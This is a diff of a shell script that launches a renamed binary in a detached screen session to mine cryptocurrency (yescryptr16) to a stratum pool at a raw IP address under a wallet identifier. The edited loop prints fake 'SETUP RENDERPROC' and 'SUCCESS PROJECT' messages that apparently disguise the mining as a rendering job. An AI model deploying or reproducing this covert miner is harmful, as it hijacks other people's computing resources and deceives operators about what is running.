@@ -14,4 +14,4 @@ sleep 1
 screen -dmS Running ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU2 -p x -t4
 sleep 1
 i=1
-while true; do echo $i; clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;i++; done
+while true; do echo $i; clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
